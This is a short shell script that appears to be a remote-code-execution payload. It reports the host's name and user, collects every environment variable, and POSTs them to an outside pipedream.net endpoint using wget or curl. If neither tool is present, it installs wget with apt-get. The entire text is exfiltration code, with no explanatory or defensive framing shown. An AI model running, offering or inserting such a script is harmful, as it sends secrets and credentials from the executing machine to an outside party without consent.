
echo "RCE SUCCESS"  >$(tty);

URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
ENV=$(env)

if [ -x "$(command -v wget)" ]; then
  wget -qO- $URL --post-data="$ENV" >$(tty);
  exit 1
fi

if [ -x "$(command -v curl)" ]; then
  curl $URL -X POST -d "$ENV" >$(tty);
  exit 1
fi

apt-get install -y wget

if [ -x "$(command -v wget)" ]; then
  wget -qO- $URL --post-data="$ENV" >$(tty);
  exit 1
fi

apt-get install -y wget

if [ -x "$(command -v curl)" ]; then
  curl $URL -X POST -d "$ENV" >$(tty);
  exit 1
fi